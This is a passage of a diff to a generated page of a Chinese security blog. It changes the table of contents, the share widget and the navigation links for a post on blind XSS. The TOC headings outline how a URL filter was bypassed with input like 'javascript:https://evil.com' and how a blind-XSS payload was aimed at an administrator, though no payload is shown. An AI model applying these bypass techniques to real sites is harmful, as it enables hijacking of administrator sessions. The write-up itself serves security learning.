href="#然后用表单创建者打开看看发生了什么，很不幸的是过滤器编码了双引号，我们输入的数据变成了https-example-com-quot-22“"><span class="toc-number">14.</span> <span class="toc-text">然后用表单创建者打开看看发生了什么，很不幸的是过滤器编码了双引号，我们输入的数据变成了https://example.com/?"%22“</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注意（标签）中呈现的链接"><span class="toc-number">15.</span> <span class="toc-text">注意（标签）中呈现的链接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#接着我尝试采用Fuzzing测试，当尝试-test-https-example-com时过滤器接受了这种输入"><span class="toc-number">16.</span> <span class="toc-text">接着我尝试采用Fuzzing测试，当尝试 test:https://example.com时过滤器接受了这种输入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#然后又开始尝试javascript-https-evil-com-同样的过滤器也没有过滤，现在我已经很确定这里存在XSS，但它需要真正的网站与我的payload结合使用才有效"><span class="toc-number">17.</span> <span class="toc-text">然后又开始尝试javascript:https://evil.com 同样的过滤器也没有过滤，现在我已经很确定这里存在XSS，但它需要真正的网站与我的payload结合使用才有效</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#所以我重新构造的payload是"><span class="toc-number">18.</span> <span class="toc-text">所以我重新构造的payload是</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#最后的最后，我们想要制作一个Blind-XSS来攻击真正的管理员，所以最终的payload是"><span class="toc-number">19.</span> <span class="toc-text">最后的最后，我们想要制作一个Blind XSS来攻击真正的管理员，所以最终的payload是</span></a></li></ol>
         
     </div>
     <style>
@@ -428,7 +396,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"kali使用入坑指南（二）　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"第十六篇：盲注XSS　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -485,15 +453,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/03/10/Firewalk-原理/" title="上一篇: Firewalk 原理">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/03/01/利用iodine绕过防火墙/" title="下一篇: 利用iodine绕过防火墙">
+            <a href="/2019/02/14/第十五篇：SQL注入读取、写入文件/" title="下一篇: 第十五篇：SQL注入读取、写入文件">
                 <i class="fa fa-angle-right"></i>
             </a>
         
